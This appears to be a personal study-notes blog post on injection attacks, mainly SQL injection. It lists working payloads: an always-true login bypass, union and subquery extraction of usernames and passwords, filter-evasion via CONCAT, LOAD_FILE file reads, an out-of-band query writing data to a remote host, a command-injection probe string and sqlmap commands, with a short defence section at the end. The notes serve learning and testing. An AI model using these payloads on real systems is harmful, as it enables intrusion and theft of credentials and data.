---
title: "Injection"
date: 2020-06-22T18:24:26+10:00

hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Injection

Inserting arbitrary information that breaks the handling code in the server

# SQLi (SQL Injection)

ie `x' or '1'='1`

> SELECT * FROM users WHERE password = ' `x' or '1'='1` '

## Note

Do not DOS!  

Limit the amount of data you fetch, as you may accidentally perform a Denial of Service.  

## Techniques

* Add your own string escapes to your string to break the code
* Add comments (`--`) after the string escape to disable other parts of the SQL query

## Wildcards

`SELECT * FROM users WHERE username LIKE 'admi%';

`SELECT TOP 10 * FROM Articles WHERE Content LIKE '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R"_)][%](%[x])%a][$*"£$-9]_%'`

## OOB - Out of Band Injection

_When the attacker is unable to use the same channel to both launch and gather results_

Sometimes we may have to perform a blind injection, and will be unable to gather verbose results.  
(Or there maybe an outbound Web Application Firewall).  

OOB injection relies on the dbms making a DNS/HTTP request to deliver data to an attacker

i.e. MySQL

* `select @@secure_file_priv`

NULL -> Disabled  
'/directory' -> Restricted import  
Default of "" on MySQL < 5.5.53

* `SELECT * INTO outfile '//192.168.1.1/url.txt'`

## OS-Interative Databases

If the database access files for ETL (extract, transform, load) operations, there may be vulnerabilities which allow us to read and write into the OS

* `LOAD DATA INFILE 'data.txt' INTO TABLE db2.my_table;`
* `SELECT LOAD_FILE('/tmp/world') AS world;`

It may even be possible to execute shell commands

## Subquerying

Make a query inside of a query

* `Select * from users where isAdmin = (select isAdmin from permissions);`
* `Select user,password from users where username='injectionpoint' union select (select permissions from users limit 1), 'asdf';`

## Union by Copypaste

Ehhh

## SQL Functions

* CHR()
* CAST()
* CONCAT()
* XPCMDSHELL()

These may help you to bypass WAFs/Filters, extract more content, bypass type constraints.  

i.e. if 'admin' is blacklisted -> `CONCAT(chr(0x61), chr(0x64), ...)`

i.e exfil information -> `SELECT CONCAT(username,"|",password)` FROM users`

i.e to bypass type constraints -> `CAST(id as VARCHAR)`

## Fingerprinting

Which DBMS are we using?

i.e. @@Version, Version(), sqlite_version()

For boolean based injections, we could use `substr(version(), 1, 1)=5` to check if the server version is `5.xx`

## Probing for Vulnerabilities

To find possible vulnerabilities, we want to find error/verbose messages that respond to our input.  
This allows us to figure out what attack vectors we can try.

A **'magic string'** is a piece of text which contains several possible attack-vectors to probe if a server is vulnerable to SQLi

```
'";<lol/>../--#`ls`
```

### SQLmap

`sqlmap` is a tool to automatically perform SQL queries - to fuzz for injection vulnerabilities.  

It attempts to identify the database type, and then performs database-specific vectors

* `./sqlmap -r file.txt --dbms=mySQL`
* `./sqlmap -r file.txt --dbs` - Get databases
* `./sqlmap -r file.txt --dbs --tables` - Get databases and tables

# NoSQLi

* `db.users.find({username: username, password: password})`
* `db.users.find({username: username, 'password': {'$gt': ""}})`

---

# Defending against SQLi

* Parameterised Queries - Don't just perform a simple concatenation or string replacement
  * Don't just trust the people who wrote parameterised query libraries